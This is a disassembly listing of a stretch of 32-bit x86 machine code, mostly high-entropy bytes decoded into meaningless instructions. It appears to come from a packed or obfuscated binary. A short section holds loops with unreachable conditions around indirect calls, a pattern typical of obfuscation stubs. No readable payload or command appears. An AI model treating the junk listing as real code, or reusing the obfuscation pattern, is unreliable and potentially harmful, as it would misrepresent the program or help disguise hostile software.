  4037bb:	add    al,BYTE PTR [edx+ebx*1+0x8c8cdd1]
  4037c2:	loopne 0x4037f5
  4037c4:	jnp    0x403765
  4037c6:	mov    edi,0xb73e3fa5
  4037cb:	arpl   WORD PTR [eax],ax
  4037cd:	sbb    esi,ebp
  4037cf:	push   eax
  4037d0:	add    al,0x62
  4037d2:	mov    bl,0xc3
  4037d4:	xchg   ebx,eax
  4037d5:	icebp  
  4037d6:	push   ds
  4037d7:	test   al,0x17
  4037d9:	fs pop esp
  4037db:	pop    ebx
  4037dc:	add    esi,ebp
  4037de:	lds    edi,FWORD PTR [edx]
  4037e0:	mov    ch,ch
  4037e2:	mov    ebx,0xa5986b50
  4037e7:	jle    0x4037c1
  4037e9:	(bad)  [eax+0x59]
  4037ec:	or     al,0x6c
  4037ee:	loopne 0x4037c9
  4037f0:	out    dx,eax
  4037f1:	jbe    0x403869
  4037f3:	push   esi
  4037f4:	out    dx,eax
  4037f5:	adc    BYTE PTR [esi],cl
  4037f7:	push   edi
  4037f8:	cmp    BYTE PTR [esi-0x510cc4b8],al
  4037fe:	mov    ebp,0xbf00138e
  403803:	mov    eax,ds:0x9f223d18
  403808:	nop    esi
  40380b:	in     al,dx
  40380c:	mov    dh,0xf6
  40380e:	leave  
  40380f:	jg     0x4037c6
  403811:	adc    DWORD PTR [edi-0x21],edi
  403814:	dec    esi
  403815:	fld    QWORD PTR [edi-0xa2bb694]
  40381b:	out    dx,eax
  40381c:	hlt    
  40381d:	xchg   edx,eax
  40381e:	call   0xda33:0x5410cb7a
  403825:	and    eax,0x5aae9998
  40382a:	inc    esi
  40382b:	mov    esp,DWORD PTR [ecx]
  40382d:	cli    
  40382e:	xchg   edi,eax
  40382f:	inc    edi
  403830:	xor    BYTE PTR [eax],al
  403832:	test   al,0x3b
  403834:	in     al,dx
  403835:	or     BYTE PTR [edx],bh
  403837:	lock (bad) 
  403839:	push   edx
  40383a:	ror    DWORD PTR [eax],cl
  40383c:	cmp    ecx,esi
  40383e:	cmp    al,0x35
  403840:	mov    esi,0xf35abe29
  403845:	arpl   WORD PTR [esi+ebp*4+0x6],bx
  403849:	xor    eax,0xf06d147d
  40384e:	test   eax,0x3b981f3b
  403853:	dec    ebp
  403854:	loopne 0x4037e3
  403856:	xchg   ecx,eax
  403857:	push   ebx
  403858:	cmc    
  403859:	cmpxchg DWORD PTR [ecx+0x61],eax
  40385d:	jge    0x40385e
  40385f:	stos   BYTE PTR es:[edi],al
  403860:	(bad)  
  403861:	sahf   
  403862:	popa   
  403863:	lds    esp,FWORD PTR [eax]
  403865:	adc    al,0x62
  403867:	mov    bl,0x3f
  403869:	mov    al,0xc8
  40386b:	lahf   
  40386c:	lds    ebp,FWORD PTR [ebx]
  40386e:	int    0x54
  403870:	push   ecx
  403871:	dec    esp
  403872:	ret    0x3c04
  403875:	adc    al,0xf0
  403877:	mov    edi,0xb1f201ea
  40387c:	repnz sub eax,0xc2ec3cbb
  403882:	jp     0x403827
  403884:	add    bl,bl
  403886:	call   0x74f3:0x6416f3b5
  40388d:	pop    es
  40388e:	dec    ecx
  40388f:	out    dx,eax
  403890:	das    
  403891:	sub    al,0xd9
  403893:	out    0x67,al
  403895:	cld    
  403896:	sbb    BYTE PTR [eax-0x14],ch
  403899:	cmp    ebp,DWORD PTR [eax+0xa]
  40389c:	adc    al,BYTE PTR [edx]
  40389e:	int    0x12
  4038a0:	repnz out 0x43,al
  4038a3:	cmp    DWORD PTR [edx],edi
  4038a5:	add    eax,edi
  4038a7:	mov    ecx,0x8d655391
  4038ac:	cmp    ecx,DWORD PTR [ebx+ebp*1]
  4038af:	or     dh,al
  4038b1:	ins    DWORD PTR es:[edi],dx
  4038b2:	loop   0x4038af
  4038b4:	(bad)  
  4038b5:	pusha  
  4038b6:	imul   ecx,DWORD PTR [edx],0x7b
  4038b9:	xchg   edi,eax
  4038ba:	mov    ch,0xd9
  4038bc:	dec    edx
  4038bd:	pop    ecx
  4038be:	xchg   DWORD PTR [edi+0x1687425e],esi
  4038c4:	add    eax,0x4a5837f6
  4038c9:	mov    al,bh
  4038cb:	(bad)  
  4038cc:	mov    esp,0xa3f56f06
  4038d1:	jo     0x403909
  4038d3:	sahf   
  4038d4:	ret    0x3421
  4038d7:	call   0x83b0:0xd07d171b
  4038de:	inc    eax
  4038df:	lea    edi,[eax-0x5e]
  4038e2:	xor    al,0x52
  4038e4:	pop    eax
  4038e5:	aas    
  4038e6:	and    bh,BYTE PTR [edi]
  4038e8:	das    
  4038e9:	jo     0x40392b
  4038eb:	popa   
  4038ec:	addr16 int 0x73
  4038ef:	pop    ebx
  4038f0:	mov    edi,0xb08dccb6
  4038f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038f6:	les    edi,FWORD PTR [ecx-0x747bf961]
  4038fc:	or     BYTE PTR [ebp-0x6d7a62dc],0x99
  403903:	(bad)  [ebx]
  403905:	sub    BYTE PTR [edx-0x14],cl
  403908:	into   
  403909:	dec    ecx
  40390a:	imul   edx,DWORD PTR [edi+edi*8],0xfffffff8
  40390e:	test   eax,0xc7e00077
  403913:	ss pop ebp
  403915:	rcl    ah,cl
  403917:	out    dx,eax
  403918:	or     ebp,DWORD PTR [eax-0x4053ff0c]
  40391e:	inc    edx
  40391f:	in     al,0xc4
  403921:	loope  0x4038e3
  403923:	dec    esi
  403924:	in     al,0x38
  403926:	add    dl,BYTE PTR [ebp+0x65c1a333]
  40392c:	dec    eax
  40392d:	push   ebp
  40392e:	cs pop edi
  403930:	or     eax,0x598098c3
  403935:	int3   
  403936:	fcom   st(4)
  403938:	sub    cl,BYTE PTR [edi+0x4f]
  40393b:	inc    eax
  40393c:	retf   
  40393d:	push   edi
  40393e:	mov    esi,0x5e3b02fe
  403943:	inc    esi
  403944:	inc    edx
  403945:	push   edx
  403946:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403947:	mov    ds,WORD PTR [edi+ecx*2]
  40394a:	dec    ecx
  40394b:	cwde   
  40394c:	xchg   esp,eax
  40394d:	aaa    
  40394e:	push   esp
  40394f:	daa    
  403950:	icebp  
  403951:	adc    ecx,DWORD PTR [edi+edi*2]
  403954:	or     ebp,DWORD PTR [edx+ebx*8-0x62]
  403958:	mov    ss,eax
  40395a:	cwde   
  40395b:	(bad)
  40395e:	mov    al,0x4c
  403960:	loop   0x4038ff
  403962:	jmp    0xfceca7e8
  403967:	adc    esi,DWORD PTR ds:0x70339235
  40396d:	fidivr WORD PTR [esi+edi*8]
  403970:	xchg   DWORD PTR [ecx+0xf58e491],eax
  403976:	mov    al,0xb7
  403978:	mov    ebp,0x1e06a740
  40397d:	loope  0x403946
  40397f:	std    
  403980:	popf   
  403981:	push   ebp
  403982:	hlt    
  403983:	fist   DWORD PTR [edi-0x22]
  403986:	adc    BYTE PTR [esi-0x2],dl
  403989:	sub    al,0x3f
  40398b:	xlat   BYTE PTR ds:[ebx]
  40398c:	or     DWORD PTR [ecx-0x2ff03e93],esi
  403992:	jg     0x403975
  403994:	cmp    BYTE PTR [edi],dl
  403996:	jns    0x4039f3
  403998:	icebp  
  403999:	rcl    DWORD PTR [ebx-0xe],cl
  40399c:	cmp    edi,esi
  40399e:	pushf  
  40399f:	dec    eax
  4039a0:	add    eax,0xdc6c9ed9
  4039a5:	sub    ebp,esp
  4039a7:	sbb    DWORD PTR [edi-0x139555ee],0x75
  4039ae:	in     al,0xc5
  4039b0:	and    al,0xea
  4039b2:	test   BYTE PTR [ecx],cl
  4039b4:	xor    al,0xd3
  4039b6:	jle    0x4039f9
  4039b8:	aad    0x6
  4039ba:	rcl    bh,1
  4039bc:	jmp    0x40394c
  4039be:	cli    
  4039bf:	add    al,0x70
  4039c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039c2:	fld    TBYTE PTR ds:0x3045c775
  4039c8:	pop    eax
  4039c9:	retf   
  4039ca:	leave  
  4039cb:	jp     0x403a3b
  4039cd:	sub    eax,0x40406766
  4039d2:	lods   al,BYTE PTR ds:[esi]
  4039d3:	pop    ebp
  4039d4:	cmp    al,0xf6
  4039d6:	scas   al,BYTE PTR es:[edi]
  4039d7:	shl    DWORD PTR [edx+ebp*4+0x43],0xf4
  4039dc:	xchg   esp,eax
  4039dd:	mov    ecx,0x11abdf44
  4039e2:	pop    ebp
  4039e3:	sbb    ah,BYTE PTR [edi]
  4039e5:	dec    eax
  4039e6:	outs   dx,DWORD PTR ds:[esi]
  4039e7:	push   edi
  4039e8:	(bad)  
  4039e9:	(bad)  
  4039ea:	pop    ebp
  4039eb:	sub    DWORD PTR [ebp+0x51],ecx
  4039ee:	in     al,0xcb
  4039f0:	je     0x40397f
  4039f2:	xchg   edx,eax
  4039f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039f4:	aad    0xb7
  4039f6:	jle    0x4039b5
  4039f8:	in     al,0x24
  4039fa:	adc    DWORD PTR [ebx],ecx
  4039fc:	dec    eax
  4039fd:	(bad)  
  4039fe:	(bad)  
  4039ff:	in     al,dx
  403a00:	xor    al,BYTE PTR [ecx-0x696b5a9c]
  403a06:	clc    
  403a07:	loope  0x403990
  403a09:	sub    ah,BYTE PTR [esi]
  403a0b:	ds push es
  403a0d:	adc    DWORD PTR [ebx+0x1d8bf045],ecx
  403a13:	jmp    0x8b407cbb
  403a18:	sbb    ecx,DWORD PTR [ecx]
  403a1a:	sbb    eax,0x42a2f5
  403a1f:	xor    eax,esi
  403a21:	and    DWORD PTR ds:0x42a2dd,0x0
  403a2b:	jmp    0x403a3f
  403a30:	xor    ebx,ebx
  403a32:	or     ebx,DWORD PTR ds:0x42a2dd
  403a38:	inc    ebx
  403a39:	mov    DWORD PTR ds:0x42a2dd,ebx
  403a3f:	cmp    DWORD PTR ds:0x42a2dd,0x1e
  403a46:	jae    0x403a74
  403a4c:	cmp    DWORD PTR ds:0x42a2dd,0x21
  403a53:	jne    0x403a6d
  403a59:	push   DWORD PTR [ebp-0xc]
  403a5c:	push   DWORD PTR [ebp-0x1c]
  403a5f:	push   DWORD PTR [ebp-0xc]
  403a62:	push   0x42a5c5
  403a67:	call   DWORD PTR ds:0x4251d0
  403a6d:	jmp    0x403a30
  403a72:	sub    ebx,ebx
  403a74:	add    eax,edi
  403a76:	or     DWORD PTR ds:0x42a3f5,0x53c
  403a80:	mov    DWORD PTR [ebp-0xc],eax
  403a83:	and    DWORD PTR ds:0x42a335,0x0
  403a8d:	jmp    0x403a9f
  403a92:	mov    ebx,DWORD PTR ds:0x42a335
  403a98:	inc    ebx
  403a99:	mov    DWORD PTR ds:0x42a335,ebx
  403a9f:	cmp    DWORD PTR ds:0x42a335,0x1a
  403aa6:	jae    0x403fef
  403aac:	cmp    DWORD PTR ds:0x42a335,0x29
  403ab3:	jne    0x403ad9
  403ab9:	push   DWORD PTR [ebp-0x20]
  403abc:	push   0x42a3cd
  403ac1:	push   DWORD PTR [ebp-0x10]
  403ac4:	push   0x42a4e6
  403ac9:	push   0x2897
  403ace:	push   0x7575
  403ad3:	call   DWORD PTR ds:0x4251d4
  403ad9:	jmp    0x403a92
  403ade:	add    DWORD PTR ds:0x42a371,edx
  403ae4:	jmp    0x403fef
  403ae9:	iret   
  403aea:	ror    edi,1
  403aec:	aas    
  403aed:	rol    ecx,1
  403aef:	iret   
  403af0:	rcl    DWORD PTR [ebx+0x19],1
  403af3:	and    eax,DWORD PTR cs:[ecx]
  403af6:	popa   
  403af7:	sbb    DWORD PTR [ecx],esp
  403af9:	call   0x6ab8b31f
  403afe:	jl     0x403b78
  403b00:	js     0x403b27
  403b02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b03:	in     eax,0x3b
  403b05:	bound  ecx,QWORD PTR [eax+eax*8]
  403b08:	pushf  
  403b09:	xchg   DWORD PTR [esi+0x7a311a17],ecx
  403b0f:	xchg   edi,eax
  403b10:	enter  0x3f80,0xe1
  403b14:	mov    esi,0x9c2b3536
  403b19:	mov    eax,DWORD PTR [edx-0x68]
  403b1c:	lahf   
  403b1d:	mov    ebx,0xb7d6cfec
  403b22:	ret    0x2a06
  403b25:	jae    0x403aa8
  403b27:	jecxz  0x403b8c
  403b29:	push   edx
  403b2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b2b:	mov    eax,0x3235ce14
  403b30:	into   
  403b31:	xlat   BYTE PTR ds:[ebx]
  403b32:	and    ebx,DWORD PTR [esi-0x30]
  403b35:	mov    dh,0x71
  403b37:	xor    BYTE PTR [esi+0x7ae89fa7],bh
  403b3d:	ja     0x403ad4
  403b3f:	stos   DWORD PTR es:[edi],eax
  403b40:	xor    DWORD PTR [edi-0x1a],0x573b3961
  403b47:	test   ecx,edx
  403b49:	ret    0x338e
  403b4c:	adc    al,0x3f
  403b4e:	sbb    dl,dh
  403b50:	dec    esp
  403b51:	and    eax,0xbf7a13aa
  403b56:	cmp    DWORD PTR [ecx],eax
  403b58:	push   edx
  403b59:	mov    bl,0x1
  403b5b:	in     eax,0x54
  403b5d:	(bad)  
  403b5e:	lock xchg BYTE PTR [edx+0xa],bh
  403b62:	je     0x403baf
  403b64:	push   eax
  403b65:	dec    edi
  403b66:	jp     0x403bc3
  403b68:	mov    ch,BYTE PTR [ecx-0x6f]
  403b6b:	dec    BYTE PTR [esi+0xd]
  403b6e:	pushf  
  403b6f:	out    0xdc,al
  403b71:	sbb    esi,esp
  403b73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b74:	stc    
  403b75:	cmp    esi,DWORD PTR [ebx-0x29]
  403b78:	jns    0x403b2a
  403b7a:	mov    ch,0xcb
  403b7c:	sbb    dh,BYTE PTR [ebp+esi*1-0x489ff6dd]
  403b83:	ret    
  403b84:	and    al,BYTE PTR [ebx+0x2f]
  403b87:	mov    BYTE PTR [esi+esi*4-0x33],ch
  403b8b:	cmp    DWORD PTR [eax],ebp
  403b8d:	mov    ah,0x94
  403b8f:	dec    ecx
  403b90:	pop    esp
  403b91:	aas    
  403b92:	rep stos BYTE PTR es:[edi],al
  403b94:	ret    0x43e7
  403b97:	cmc    
  403b98:	cmp    ah,BYTE PTR ss:[edi+esi*1]
  403b9c:	call   0x1e294103
  403ba1:	adc    eax,0xd350e84d
  403ba6:	xchg   edx,eax
  403ba7:	shl    DWORD PTR [eax+eax*1],cl
  403baa:	lock ins DWORD PTR es:[di],dx
  403bad:	int3   
  403bae:	ins    BYTE PTR es:[edi],dx
  403baf:	lock out 0x49,eax
  403bb2:	addr16 mov ds:0x9d80,al
  403bb6:	mov    ecx,0xd0ae505e
  403bbb:	mov    eax,0x49b3dce
  403bc0:	test   BYTE PTR [ecx-0x22],0x59
  403bc4:	fidivr DWORD PTR [edi-0x20]
  403bc7:	into   
  403bc8:	cs in  eax,dx
  403bca:	cvtpi2ps xmm4,QWORD PTR [eax]
  403bcd:	inc    edi
  403bce:	lock jge 0x403b83
  403bd1:	nop
  403bd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bd3:	inc    ebx
  403bd4:	(bad)  
  403bd6:	out    dx,eax
  403bd7:	mov    ds:0x86e0e42e,eax
  403bdc:	and    eax,0x6518f04b
  403be1:	pop    ebp
  403be2:	sahf   
  403be3:	lods   al,BYTE PTR ds:[esi]
  403be4:	or     dl,BYTE PTR [ecx-0x64238d6b]
  403bea:	inc    edi
  403beb:	daa    
  403bec:	(bad)  
  403bee:	(bad)  
  403bef:	out    0x1f,eax
  403bf1:	pop    ss
  403bf2:	pop    edi
  403bf3:	push   esp
  403bf4:	inc    ecx
  403bf5:	shl    eax,0x7c
  403bf8:	jns    0x403bc5
  403bfa:	pop    eax
  403bfb:	sub    ebx,edx
  403bfd:	(bad)  
  403bfe:	pop    ss
  403bff:	sbb    al,0x1b
  403c01:	push   esp
  403c02:	std    
  403c03:	push   0x3f46a90a
  403c08:	scas   al,BYTE PTR es:[edi]
  403c09:	jmp    0xdd71b435
  403c0e:	lods   al,BYTE PTR ds:[esi]
  403c0f:	xchg   edi,eax
  403c10:	(bad)  
  403c11:	retf   
  403c12:	inc    ebx
  403c13:	pop    ss
  403c14:	or     DWORD PTR [esp+ebp*1-0x79],0xffffffc9
  403c19:	jo     0x403c85
  403c1b:	stc    
  403c1c:	pop    edi
  403c1d:	retf   
  403c1e:	and    eax,0x2ff429f2
  403c23:	sub    bh,BYTE PTR ds:0xe9b16235
  403c2a:	enter  0x2b01,0x9b
  403c2e:	sbb    dl,BYTE PTR [di+0x3f]
  403c32:	or     eax,0x276531e6
  403c37:	sbb    dh,ch
  403c39:	cmp    esi,DWORD PTR [ecx+0xc]
  403c3c:	sbb    esp,DWORD PTR [ebx+0x9]
  403c3f:	call   0x6fa9444a
  403c44:	(bad)  
  403c45:	mov    ecx,0xe791d474
  403c4a:	aad    0x92
  403c4c:	and    ah,BYTE PTR [esi-0x34]
  403c4f:	mov    ebx,esp
  403c51:	xchg   DWORD PTR [eax],ebp
  403c53:	mov    ebp,cs
  403c55:	sbb    eax,0xc7ad1478
  403c5a:	mov    esp,0x719d473e
  403c5f:	xchg   BYTE PTR [eax],ah
  403c61:	xor    esi,DWORD PTR [eax]
  403c63:	enter  0x164f,0x94
  403c67:	push   edx
  403c68:	test   al,0xb7
  403c6a:	rol    BYTE PTR [ebx-0x650263c5],cl
  403c70:	cmp    al,0xde
  403c72:	imul   eax,DWORD PTR [edi+0x5],0x325570b0
  403c79:	jbe    0x403c25
  403c7b:	clc    
  403c7c:	int    0x7
  403c7e:	(bad)  
  403c7f:	loopne 0x403ce3
  403c81:	shl    BYTE PTR [edx+0x8243c2],0xc6
  403c88:	mov    ebx,edi
  403c8a:	pop    ss
  403c8b:	data16 out 0x92,al
  403c8e:	fild   QWORD PTR [edx+ecx*1-0x22c569c8]
  403c95:	and    al,0x70
  403c97:	cdq    
  403c98:	cmp    DWORD PTR [edx+0x77],eax
  403c9b:	push   DWORD PTR [ecx-0x57ad655d]
  403ca1:	inc    edx
  403ca2:	fisub  DWORD PTR [esi+0x7d947777]
  403ca8:	pop    ds
  403ca9:	mov    bl,0x45
  403cab:	add    BYTE PTR [eax+0x780caf86],ch
  403cb1:	inc    edx
  403cb2:	dec    esi
  403cb3:	pop    DWORD PTR [esi+0x64df8c72]
  403cb9:	dec    edx
  403cba:	and    eax,DWORD PTR [ebx+0x6fe96c5f]
  403cc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cc1:	cmp    eax,0x43640a6
  403cc6:	ins    DWORD PTR es:[edi],dx
  403cc7:	scas   al,BYTE PTR es:[edi]
  403cc8:	and    ah,bl
  403cca:	push   cs
  403ccb:	mov    ah,0x7d
  403ccd:	push   es
  403cce:	xchg   ebx,eax
  403ccf:	outs   dx,DWORD PTR ds:[esi]
  403cd0:	vandnps xmm0,xmm1,XMMWORD PTR [edx]
  403cd4:	mov    eax,ds:0xe6b31ed1
  403cd9:	jecxz  0x403c7f
  403cdb:	in     eax,0x8
  403cdd:	xchg   edi,eax
  403cde:	push   es
  403cdf:	jne    0x403d4a
  403ce1:	fcmovbe st,st(1)
  403ce3:	add    ah,BYTE PTR [esi-0x48]
  403ce6:	pusha  
  403ce7:	or     DWORD PTR [esi+0x50],edx
  403cea:	pop    es
  403ceb:	test   al,0xca
  403ced:	pop    ebx
  403cee:	sbb    eax,0x726ed3d6
  403cf3:	out    dx,al
  403cf4:	jae    0x403ced
  403cf6:	mov    ebp,0xfe6a2c6c
  403cfb:	mov    cl,0x36
  403cfd:	shr    ecx,1
  403cff:	and    al,0xee
  403d01:	ret    
  403d02:	mov    ebx,DWORD PTR [eax-0x7f]
  403d05:	dec    ebp
  403d06:	aad    0xdf
  403d08:	test   al,0xd1
  403d0a:	push   esi
  403d0b:	sbb    esi,ebp
  403d0d:	(bad)  
  403d0e:	dec    esi
  403d0f:	push   ecx
  403d10:	(bad)  
  403d11:	mov    eax,0x39d5e871
  403d16:	mov    ds:0x234542ee,al
  403d1b:	adc    dh,cl
  403d1d:	sti    
  403d1e:	add    BYTE PTR [ebx+0x2e],bl
  403d21:	adc    esi,DWORD PTR [esi]
  403d23:	fwait
  403d24:	out    0x40,eax
  403d26:	push   cs
  403d27:	xlat   BYTE PTR ds:[ebx]
  403d28:	jo     0x403d3a
  403d2a:	aad    0xc1
  403d2c:	cmp    al,0xae
  403d2e:	cs xor esp,esi
  403d31:	jle    0x403d06
  403d33:	test   eax,0x7f0ddcc2
  403d38:	adc    esi,DWORD PTR [ebx+edi*2]
  403d3b:	std    
  403d3c:	fwait
  403d3d:	push   esp
  403d3e:	dec    edi
  403d3f:	xlat   BYTE PTR ds:[ebx]
  403d40:	jmp    0x403ce5
  403d42:	out    dx,al
  403d43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d44:	xor    eax,0xe2c36e66
  403d49:	sub    esi,DWORD PTR [esi+0x32]
  403d4c:	push   ds
  403d4d:	inc    ebx
  403d4e:	test   DWORD PTR [esi+eiz*2+0x4172788d],ebp
  403d55:	mov    BYTE PTR [esi+0x70],bl
  403d58:	mov    esp,0xa1bd31c1
  403d5d:	mov    edx,esi
  403d5f:	pushf  
  403d60:	test   DWORD PTR [ebp-0x14722f81],esp
  403d66:	je     0x403dbc
  403d68:	adc    dh,BYTE PTR ss:[ebx-0x39]
  403d6c:	xor    esi,DWORD PTR [ecx+ecx*8]
  403d6f:	sub    BYTE PTR [esi+ebp*8],bl
  403d72:	lods   al,BYTE PTR ds:[esi]
  403d73:	leave  
  403d74:	push   esp
  403d75:	inc    ebx
  403d76:	in     eax,dx
  403d77:	std    
  403d78:	out    0x13,al
  403d7a:	icebp  
  403d7b:	sbb    bl,dh
  403d7d:	clc    
  403d7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d7f:	lods   al,BYTE PTR ds:[esi]
  403d80:	pop    ebx
  403d81:	and    al,0xd4
  403d83:	call   0xe022c759
  403d88:	push   edx
  403d89:	jnp    0x403d7d
  403d8b:	nop
  403d8c:	jns    0x403e0a
  403d8e:	jle    0x403db6
  403d90:	mov    es,edx
  403d92:	mov    ah,BYTE PTR ds:0xcf2ad605
  403d98:	jbe    0x403dab
  403d9a:	inc    eax
  403d9b:	lock mov eax,esp
  403d9e:	add    dh,BYTE PTR [bx+si+0x2f8d]
  403da3:	sub    eax,0x2dc4d45b
  403da8:	mov    esp,0x61077bbf
  403dad:	test   ah,0xdc
  403db0:	jmp    0xf0b3:0x95b9e852
  403db7:	pushf  
  403db8:	sbb    BYTE PTR [ebx-0x6b0a71f0],dl
  403dbe:	jp     0x403da3
  403dc0:	push   ss
  403dc1:	out    dx,eax
  403dc2:	sbb    edi,esp
  403dc4:	jmp    0xb843:0x5bae4bf2
  403dcb:	push   ds
  403dcc:	xor    esi,DWORD PTR [edi-0x63ebfd63]
  403dd2:	sbb    esp,DWORD PTR [esi-0x2db0230c]
  403dd8:	sbb    DWORD PTR [edx+0x73651978],edx
  403dde:	sbb    eax,0x4f55a887
  403de3:	retf   
  403de4:	mov    ds,WORD PTR ds:0x604d5982
  403dea:	add    ebp,DWORD PTR [edi]
  403dec:	push   eax
  403ded:	mov    dh,0x38
  403def:	adc    esp,DWORD PTR [edi-0xa]
  403df2:	cmc    
  403df3:	mov    dh,0xaa
  403df5:	inc    ebp
  403df6:	mov    cl,0x63
  403df8:	mov    ch,BYTE PTR [ebx+0x2aad63b7]
  403dfe:	push   ecx
  403dff:	add    edi,DWORD PTR [esp+edi*8-0x11]
  403e03:	or     cl,BYTE PTR [edi+0x8]
  403e06:	inc    eax
  403e07:	cmp    eax,0xee03bfac
  403e0c:	push   es
  403e0d:	mov    esi,DWORD PTR [ebx+ebp*2]
  403e10:	xchg   DWORD PTR [edi-0x5e],ecx
  403e13:	stos   BYTE PTR es:[edi],al
  403e14:	lds    ebp,FWORD PTR [ecx-0x1d]
  403e17:	jne    0x403e7a
  403e19:	xchg   esp,eax
  403e1a:	clc    
  403e1b:	jne    0x403e5a
  403e1d:	dec    eax
  403e1e:	inc    edx
  403e1f:	xchg   edi,eax
  403e20:	sbb    ebp,DWORD PTR [ecx+0x72f51d54]
  403e26:	popf   
  403e27:	sahf   
  403e28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e29:	mov    bl,0x8e
  403e2b:	or     DWORD PTR [edx+0x683998ac],edi
  403e31:	push   esi
  403e32:	xor    DWORD PTR [eax+eax*1],esp
  403e35:	inc    ecx
  403e36:	jg     0x403df6
  403e38:	imul   ecx,DWORD PTR [esi+0x5e02cedd],0x7573e93
  403e42:	(bad)  
  403e43:	out    0xb8,eax
  403e45:	jnp    0x403e93
  403e47:	(bad)  [ebx]
  403e49:	out    0xd3,eax
  403e4b:	pushf  
  403e4c:	inc    edi
  403e4d:	push   cs
  403e4e:	sahf   
  403e4f:	inc    edx
  403e50:	stos   DWORD PTR es:[edi],eax
  403e51:	(bad)  
  403e53:	out    0xb6,eax
  403e55:	dec    edx
  403e56:	dec    ebx
  403e57:	pop    ebx
  403e58:	mov    esi,0xf2e735a0
  403e5d:	test   DWORD PTR [ecx+0x34],ebx
  403e60:	arpl   WORD PTR [esi+edi*1-0x17d17278],di
  403e67:	or     al,0x81
  403e69:	mov    ah,0xe7
  403e6b:	rol    DWORD PTR [edx+0xfae0615],cl
  403e71:	sar    DWORD PTR [ecx-0x4a],0x64
  403e75:	mov    al,ds:0x68b45310
  403e7a:	xchg   ebx,eax
  403e7b:	std    
  403e7c:	addr16 pop ebp
  403e7e:	fdiv   QWORD PTR [ebx+0x562d90a2]
  403e84:	mov    bh,0x41
  403e86:	add    BYTE PTR [ebx+0x3524a8a],dh
  403e8c:	(bad)  
  403e8d:	mov    ecx,0x5578c6b8
  403e92:	push   esi
  403e93:	jb     0x403e7b
  403e95:	xchg   ecx,eax
  403e96:	ret    0x4a2d
  403e99:	adc    cl,dh
  403e9b:	pop    ebp
  403e9c:	push   eax
  403e9d:	pop    ecx
  403e9e:	repnz imul ebp,esi,0x248fff93
  403ea5:	jle    0x403e74
  403ea7:	adc    al,0x62
  403ea9:	mov    bh,0x16
  403eab:	cmp    BYTE PTR [edx],al
  403ead:	test   esp,0xe331e6c2
  403eb3:	(bad)  
  403eb5:	out    dx,eax
  403eb6:	xlat   BYTE PTR ds:[ebx]
  403eb7:	leave  
  403eb8:	sbb    eax,0x4079e629
  403ebd:	inc    ecx
  403ebe:	sahf   
  403ebf:	cdq    
  403ec0:	cmp    BYTE PTR [esi],0x71
  403ec3:	sbb    al,0xa3
  403ec5:	ins    DWORD PTR es:[edi],dx
  403ec6:	sub    al,0xe7
  403ec8:	sbb    al,0x20
  403eca:	data16 hlt 
  403ecc:	aam    0x75
  403ece:	jmp    0x124370d5
  403ed3:	hlt    
  403ed4:	or     eax,0x9f2f2b64
  403ed9:	std    
  403eda:	dec    ebp
  403edb:	mov    al,ds:0x1472daa
  403ee0:	dec    edi
  403ee1:	or     al,0xd0
  403ee3:	push   esi
  403ee4:	cmc    
  403ee5:	test   BYTE PTR [esi],ch
  403ee7:	mov    edx,0x3fef15
  403eec:	dec    eax
  403eed:	popf   
  403eee:	test   al,0x70
  403ef0:	ror    BYTE PTR [edi-0x2719a049],1
  403ef6:	sbb    BYTE PTR [esi],cl
  403ef8:	xor    al,0x7
  403efa:	mov    BYTE PTR [ebx+0x2579eeda],dh
  403f00:	mov    esp,0xcade6510
  403f05:	aas    
  403f06:	shl    BYTE PTR [esi+0x6b],0x19
  403f0a:	adc    BYTE PTR [esi+0x6],dl
  403f0d:	pop    edi
  403f0e:	push   esp
  403f0f:	mov    al,0xbc
  403f11:	add    dh,BYTE PTR [eax]
  403f13:	sbb    eax,0xcf620f1
  403f18:	(bad)  
  403f19:	in     eax,dx
  403f1a:	sub    bl,BYTE PTR [esi]
  403f1c:	sub    al,0xe7
  403f1e:	pop    eax
  403f1f:	sub    edx,DWORD PTR [esi-0x52]
  403f22:	cmp    BYTE PTR ds:0x9be6cca1,ah
  403f28:	dec    edi
  403f29:	push   es
  403f2a:	lds    esp,FWORD PTR [ebx-0x46da45dd]
  403f30:	and    al,0x53
  403f32:	push   ds
  403f33:	mov    dl,0xac
  403f35:	cs push edx
  403f37:	dec    eax
  403f38:	test   bh,dl
  403f3a:	xchg   ebp,eax
  403f3b:	pop    ecx
  403f3c:	xchg   ebp,eax
  403f3d:	mov    cl,0xd6
  403f3f:	lock xor eax,0x52c4b9c1
  403f45:	pushf  
  403f46:	push   ecx
  403f47:	and    edi,DWORD PTR [ebx+edx*2]
  403f4a:	sub    BYTE PTR ds:0x208e9448,0x67
  403f51:	inc    ecx
  403f52:	xor    BYTE PTR es:[eax],ah
  403f55:	call   0xb7594fd0
  403f5a:	enter  0xe838,0x22
  403f5e:	iret   
  403f5f:	sub    eax,DWORD PTR [esi]
  403f61:	or     al,0xc0
  403f63:	push   esi
  403f64:	out    0xb5,al
  403f66:	sbb    BYTE PTR [eax+edx*2+0x59],al
  403f6a:	fwait
  403f6b:	and    ah,cl
  403f6d:	xchg   ebp,eax
  403f6e:	mov    esp,esi
  403f70:	mov    al,ds:0x505d423e
  403f75:	and    DWORD PTR [ebx-0x86b152f],0x40f12b3e
  403f7f:	and    dh,dh
  403f81:	push   ss
  403f82:	aam    0xc2
  403f84:	pop    es
  403f85:	gs jns 0x403f2d
  403f88:	call   0x2970b889
  403f8d:	mov    esp,0x57c23cce
  403f92:	lahf   
  403f93:	sub    ebx,DWORD PTR [edx-0xf]
  403f96:	bound  esi,QWORD PTR [ebp-0x36066458]
  403f9c:	xor    edx,DWORD PTR [edx]
  403f9e:	aad    0x5b
  403fa0:	jae    0x403fe9
  403fa2:	push   eax
  403fa3:	arpl   WORD PTR [ecx],si
  403fa5:	cmovg  eax,edi
